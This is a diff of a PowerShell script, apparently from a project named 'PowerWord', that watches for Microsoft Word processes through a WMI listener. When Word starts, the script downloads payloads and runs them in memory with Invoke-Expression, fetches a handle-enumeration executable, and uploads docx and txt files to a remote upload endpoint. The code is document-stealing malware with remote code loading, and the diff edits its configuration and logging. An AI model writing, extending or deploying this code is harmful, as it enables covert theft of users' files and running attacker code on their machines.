@@ -1,30 +1,31 @@
-param (
-    $global:LogLocation = "stdout", # Remote/Local/stdout
-    $global:LogPath = "127.0.0.1:5000/log/", # Only if Remote or Local is enabled
+$config='
+$global:LogLocation = "stdout"
+$global:LogPath = "127.0.0.1:5000/log/"
 
-    $global:LiveMode = $true, # Live / Handle Close
-    $global:LiveModeInterval = 5, # Every x seconds to sync data, only in live mode
-    $global:WordFileExtentions =@('docx','txt'),
+$global:LiveMode = $true
+$global:LiveModeInterval = 5
+$global:WordFileExtentions =@("docx","txt")
 
-    $global:CommunicationMethod = "remote", # smb / remote transfer
-    $global:Remote = 'http://127.0.0.1:5000/files/upload', # Only when using remote transfer
+$global:CommunicationMethod = "remote"
+$global:Remote = "http://127.0.0.1:5000/files/upload"
 
-    $global:HandelsMethod = "code", # handels / openfiles / code
-    $global:HandlesExeMethod = "remote", # To download on scripts load or to use base64 local
-    $global:HandlesExePath = "D:\git\PowerWord\handle123.exe", # Path to save and use handles exe from.
-    $global:HandlesExeRemoteLocation = "http://127.0.0.1:8000/",
+$global:HandelsMethod = "code"
+$global:HandlesExeMethod = "remote"
+$global:HandlesExePath = "D:\git\PowerWord\handle123.exe"
+$global:HandlesExeRemoteLocation = "http://127.0.0.1:8000/"
 
-    $global:LoadFromRemote = "yes", # To download and run from memory, or use builtin payload
-    $global:RemoteLoadPath = "http://127.0.0.1:8000/", # From where to download the Payload
+$global:LoadFromRemote = "yes"
+$global:RemoteLoadPath = "http://127.0.0.1:8000/"
 
-    $global:HandlePaylod = "default",
-    $global:MonitorPayload = "default",
-    $global:SenderPayload = "default",
-    $global:LoggerPayload = "default",
-    $global:HandlePsPayload = "default",
-    $global:HandlesMonitor = "default"
-)
+$global:HandlePaylod = "default"
+$global:MonitorPayload = "default"
+$global:SenderPayload = "default"
+$global:LoggerPayload = "default"
+$global:HandlePsPayload = "default"
+$global:HandlesMonitor = "default"
+'
 
+Invoke-Expression $config
 
 function Get-Payloads{
     $FullScript = ""
@@ -86,20 +87,20 @@ function lolololol{
         $e = $event.SourceEventArgs.NewEvent.TargetInstance
         if ($e.Name -eq "winword.exe"){
             Invoke-Expression $Payload
+            Send-Log -LogString "winword"
             Start-Mon -ProcID $e.ProcessID
         }
     }
 
-    try {
-        $proc = Get-Process -Name "winword"
+
+    $proc = Get-Process -Name "winword" -ErrorAction SilentlyContinue
+    if ($proc){
         Invoke-Expression $Payload
         Start-Mon -ProcID $proc.Id
     }
-    catch {
-        Send-Log -LogString "No running winword, starting listener"
-    }
-
-    Register-WMIEvent -Query $Query -SourceIdentifier $Identifier -Action $ActionBlock 
+    $args
+    Send-Log -LogString "starting listener"
+    Register-WMIEvent -Query $Query -SourceIdentifier $Identifier -Action $ActionBlock
 }
 
 lolololol
